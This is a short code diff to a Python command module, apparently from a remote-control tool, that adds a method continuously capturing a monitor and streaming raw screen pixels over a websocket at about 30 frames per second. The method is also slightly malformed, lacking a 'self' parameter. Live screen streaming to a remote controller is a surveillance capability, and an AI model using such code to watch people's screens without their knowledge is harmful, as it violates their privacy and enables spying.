@@ -1,7 +1,10 @@
+import asyncio
 import contextlib
 import ctypes
 import base64
 
+import websockets
+from mss import mss
 from typing import Optional
 from PIL import ImageGrab
 from ..commands import Command, CommandArgs, ICommandModule, CommandResult
@@ -13,6 +16,16 @@ command_arg_map = {
 }
 
 class Visuals(ICommandModule):
+    async def stream_screen(websocket: websockets.WebSocketClientProtocol , monitor_number=1):
+        with mss() as sct:
+            monitor = sct.monitors[monitor_number]  # Monitor number
+
+            while True:
+                img = sct.grab(monitor)
+                pixels = img.rgb
+                await websocket.send(pixels)
+                await asyncio.sleep(1/30)
+            
     def screenshot(self) -> CommandResult:
         try:
             with contextlib.suppress(Exception):
